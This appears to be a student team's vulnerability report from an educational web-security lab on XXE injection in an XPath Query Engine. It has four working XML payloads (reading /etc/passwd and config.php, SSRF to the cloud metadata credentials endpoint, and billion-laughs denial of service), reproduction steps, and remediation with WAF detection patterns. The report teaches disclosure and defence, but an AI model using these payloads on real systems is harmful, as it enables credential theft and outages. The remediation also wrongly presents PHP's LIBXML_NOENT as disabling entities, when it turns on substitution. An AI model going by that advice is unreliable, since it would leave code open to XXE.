# Vulnerability Report

 CVE-ID: EDU-WEBLAB-2026-TEAM2-015

**Title:** XML External Entity (XXE) Injection via Unsanitized XML Input Enabling Sensitive File Disclosure and Server-Side Request Forgery

**Affected Lab:** XPath Query Engine

**Component:** XML Parser and XPath Query Execution Module

**Severity:** Critical

**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSS Score:** 9.8

**Description:**
A critical XML External Entity (XXE) injection vulnerability was identified in the XPath Query Engine, where the application's XML parser accepts and processes user-supplied XML input without disabling external entity resolution, validating DOCTYPE declarations, or restricting the XML feature set to a safe subset. The vulnerability exists because the parser is configured to honor external entity references declared within attacker-controlled DOCTYPE blocks, allowing an attacker to define a custom entity that maps to an arbitrary local file path or remote URL and have the parser silently resolve and embed its contents during query execution. By submitting a crafted XML payload containing a malicious `ENTITY` declaration referencing the `file://` URI scheme, an attacker can exfiltrate the contents of sensitive server filesystem files — including `/etc/passwd`, `/etc/shadow`, and application configuration files containing credentials — without any authentication or user interaction. Beyond local file disclosure, the same injection vector enables Server-Side Request Forgery (SSRF), where the parser is directed to issue outbound HTTP requests to internal network resources on behalf of the server, potentially exposing internal services, cloud metadata endpoints (e.g., `http://169.254.169.254/`), and backend infrastructure that would otherwise be inaccessible from the external network. The combination of unauthenticated exploitation, zero special conditions, and the potential for both full filesystem read access and internal network pivoting makes this a critical-severity vulnerability requiring immediate remediation.

**Proof of Concept:**
```xml
<!-- PAYLOAD 1: Local File Inclusion via XXE — retrieve /etc/passwd -->
<!-- Submit the following as the XML input to the XPath Query Engine,
     then execute the XPath query: //user/name                        -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<users>
  <user>
    <name>&xxe;</name>
  </user>
</users>

<!-- Expected output: full contents of /etc/passwd embedded in the
     query result, e.g.:
     root:x:0:0:root:/root:/bin/bash
     daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
     ...                                                              -->
```
```xml
<!-- PAYLOAD 2: Read application configuration file containing credentials -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<users>
  <user>
    <name>&xxe;</name>
  </user>
</users>
```
```xml
<!-- PAYLOAD 3: Server-Side Request Forgery (SSRF) via XXE
     Direct the parser to issue an outbound HTTP request to the
     AWS EC2 Instance Metadata Service to retrieve cloud credentials -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<users>
  <user>
    <name>&xxe;</name>
  </user>
</users>

<!-- Expected output: IAM role name or cloud credential data returned
     in the XPath query result, confirming successful SSRF via XXE    -->
```
```xml
<!-- PAYLOAD 4: Denial of Service via Billion Laughs entity expansion (OOB) -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<users><user><name>&lol4;</name></user></users>

<!-- Expected result: parser memory exhaustion leading to process crash
     or server-side Denial of Service                                  -->
```

**Steps to Reproduce:**

1. Access the XPath Query Engine interface and locate the XML input field and XPath query execution control. Confirm the application accepts raw XML by submitting a benign, well-formed XML document (e.g., `<users><user><name>test</name></user></users>`) and verifying the query `//user/name` returns `test` as expected.
2. **Test for XXE via local file disclosure:** Construct the malicious XML payload from Payload 1 in the Proof of Concept section, which declares an external entity `xxe` mapped to `file:///etc/passwd` within a DOCTYPE block, and reference it as `&xxe;` inside the document body.
3. Paste the crafted XXE payload into the XML input field, ensuring the full DOCTYPE declaration and entity reference are included exactly as specified, and enter `//user/name` as the XPath query expression to force entity resolution during query evaluation.
4. Submit the request and observe the query output rendered by the application. Confirm that the contents of `/etc/passwd` are returned in the result, demonstrating successful XXE exploitation and unauthorized read access to sensitive server filesystem data.
5. **Extend the attack to application configuration files:** Replace the `file:///etc/passwd` entity target with `file:///var/www/html/config.php` (or the path identified from the `/etc/passwd` disclosure) and resubmit with the same XPath query. Observe whether database credentials or application secrets are returned in the output.
6. **Test for SSRF via XXE:** Construct Payload 3 from the Proof of Concept section, replacing the `file://` URI scheme with `http://169.254.169.254/latest/meta-data/` to direct the parser to issue an outbound HTTP request to the cloud instance metadata service. Submit and observe whether internal network data or cloud credentials are returned in the query result.
7. **Test for Denial of Service via recursive entity expansion:** Submit Payload 4 from the Proof of Concept section, which defines exponentially expanding entities. Observe whether the parser exhausts memory or the server becomes unresponsive, confirming susceptibility to entity-expansion-based DoS attacks.
8. **Verify exploitation without authentication:** If the XPath Query Engine exposes the input interface without requiring a prior login session, repeat Steps 2–4 without an active authenticated session and confirm that XXE exploitation succeeds, demonstrating that the vulnerability is reachable by an entirely unauthenticated external attacker.
9. Capture the full HTTP request containing the XXE payload using Burp Suite or a browser developer tool and confirm the raw XML is transmitted directly to the server without any client-side pre-processing, encoding, or sanitization that could mask the true server-side exposure.
10. Document the full contents returned from each successful payload, confirming that the scope of data exposure includes user account information, application credentials, and internal network topology data — establishing the complete impact of unauthenticated XXE exploitation on the host environment.

**Remediation:**

1. **Disable external entity resolution and DOCTYPE processing in the XML parser configuration:** Configure the XML parser to explicitly disallow external entities and DOCTYPE declarations by setting the appropriate parser flags (e.g., in PHP's `libxml`: `LIBXML_NONET | LIBXML_NOENT`; in Java's `DocumentBuilderFactory`: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`). This is the single most effective control and must be applied at the parser instantiation level before any user-supplied XML is processed.
2. **Replace the vulnerable XML parser with a security-hardened library that enforces entity restrictions by default:** Adopt an XML parsing library explicitly designed to reject external entity references and recursive entity expansion out of the box (e.g., `defusedxml` for Python, `safe-libxml2` wrappers). Treat any library that requires opt-in hardening as insecure by default and apply all available restrictive flags unconditionally.
3. **Validate and reject all user-supplied XML containing DOCTYPE declarations server-side:** Implement a pre-parse validation step that inspects incoming XML for the presence of `<!DOCTYPE` and `<!ENTITY` strings before passing content to the parser. Reject all such requests with an `HTTP 400 Bad Request` response and log the attempt as a potential XXE attack indicator.
4. **Restrict the XML feature set to the minimum required subset for application functionality:** Disable all XML features not required by the application, including XInclude processing, external schema resolution, and DTD validation. Apply a strict parser profile that permits only well-formed XML document parsing with no external resource resolution of any kind.
5. **Implement network-level egress filtering to prevent SSRF exploitation of XXE:** Configure firewall rules and network policies to block outbound HTTP and file-scheme requests originating from the web server process. Restrict the server's outbound connectivity to only explicitly required external endpoints, preventing the parser from reaching internal metadata services, local network resources, or arbitrary external URLs.
6. **Apply the principle of least privilege to the XML parser process and web server account:** Ensure the process executing the XML parser runs under a non-privileged account with read access restricted to the web application directory. Deny access to sensitive filesystem paths (`/etc/shadow`, `/root/`, `/home/`, application secrets directories) to limit the files accessible via `file://` entity resolution even if external entity processing is inadvertently re-enabled.
7. **Deploy a Web Application Firewall (WAF) with XXE detection signatures:** Configure WAF rules to inspect request bodies for DOCTYPE declarations, SYSTEM and PUBLIC entity keywords, `file://` URI schemes, and common SSRF target patterns (e.g., `169.254.169.254`, `localhost`, `127.0.0.1`). Block and alert on all matching requests as a perimeter-level defense-in-depth control.
8. **Implement comprehensive logging and real-time alerting on all XML parser invocations:** Record every XML parsing operation, including a hash or truncated preview of the submitted XML, source IP, session identifier, and timestamp. Configure real-time alerts for submissions containing DOCTYPE or ENTITY keywords, and treat all such events as active XXE exploitation attempts requiring immediate investigation and incident response.

**Discovered By:** Team 2

**Date:** March 15, 2026
